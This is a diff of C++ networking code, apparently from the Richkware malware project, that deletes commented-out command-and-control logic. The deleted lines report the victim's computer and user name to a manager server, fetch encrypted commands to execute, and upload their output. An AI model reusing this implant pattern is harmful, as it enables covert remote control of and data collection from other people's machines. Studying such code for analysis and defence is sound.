@@ -38,10 +38,6 @@ Network &Network::operator=(const Network &network) {
     return *this;
 }
 
-/*Network::Network(const std::string& encryptionKeyArg) {
-    encryptionKey = encryptionKeyArg;
-    server = Server(encryptionKeyArg);
-}*/
 
 Network::Network(const std::string &serverAddressArg, const std::string &portArg,
                  const std::string &associatedUserArg,
@@ -234,51 +230,7 @@ std::string Network::fetchCommand(/*const std::string &encryptionKey*/) {
     }
     return "";
 
-//    Crypto crypto(encryptionKey);
-//    std::string device = getenv("COMPUTERNAME");
-//    device.append("/");
-//    device.append(getenv("USERNAME"));
-//
-//    std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
-//                         "&data1=agent" +
-//                         " HTTP/1.1\r\n" +
-//                         "Host: " + serverAddress + "\r\n" +
-//                         "Connection: close\r\n" +
-//                         "\r\n";
-//
-//    std::string response = RawRequest(serverAddress, port,
-//                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
-    /*
-     * JSON format returned by server:
-     * {
-     *     status: "OK",
-     *     statusCode: 1000,
-     *     message: {
-     *         commands: "[encrypted string]"
-     *     }
-     * }
-     *
-     * "encrypted string" is formatted as follows:
-     * "command1##command2##commandN"
-     * */
-    //parse message from server
-//    if (response.find("OK") != std::string::npos) {
-//        std::string delimiter = "\"message\":\"";
-//        std::string delimiter2 = "\"";
-//
-//        size_t pos = 0;
-//        std::string token;
-//        pos = response.find(delimiter);
-//        response.erase(0, pos + delimiter.length());
-//
-//        std::string token2;
-//        pos = response.find(delimiter2);
-//        token = response.substr(0, pos);
-//        return token;        //returns an encrypted string containing the commands to be executed
-//    } else {
-//        //TODO: manage KO from server
-//        return "";
-//    }
+    return "";
 }
 
 bool Network::uploadCommand(std::string commandsOutput/*, const std::string &encryptionKey*/) {
